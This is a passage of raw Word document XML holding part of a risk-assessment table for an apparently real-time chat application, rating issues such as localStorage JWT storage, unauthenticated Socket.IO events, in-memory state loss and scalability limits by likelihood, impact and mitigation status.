              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Partial — JWT signature verification exists, but storage in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>localStorage</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> and CORS policy are vulnerable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Socket.IO Event Integrity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Minimal — No authentication on socket layer; REST endpoints protected but socket events are unauthenticated</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>In-Memory State Volatility</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None — No persistence layer for presence data; relies on client reconnection; state lost on restart</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Data Integrity &amp; Consistency</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Partial — Atomic operators used consistently, but no schema-level constraints or message pagination</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Scalability Constraints</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None — Single-process architecture; no clustering, caching, or horizontal scaling mechanisms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Input Validation &amp; Error Handling</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟢 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Partial — Framework defaults (async handler, React escaping) provide baseline protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Frontend Architecture &amp; UX Resilience</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium-High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1560"/>
            <w:tcBorders>
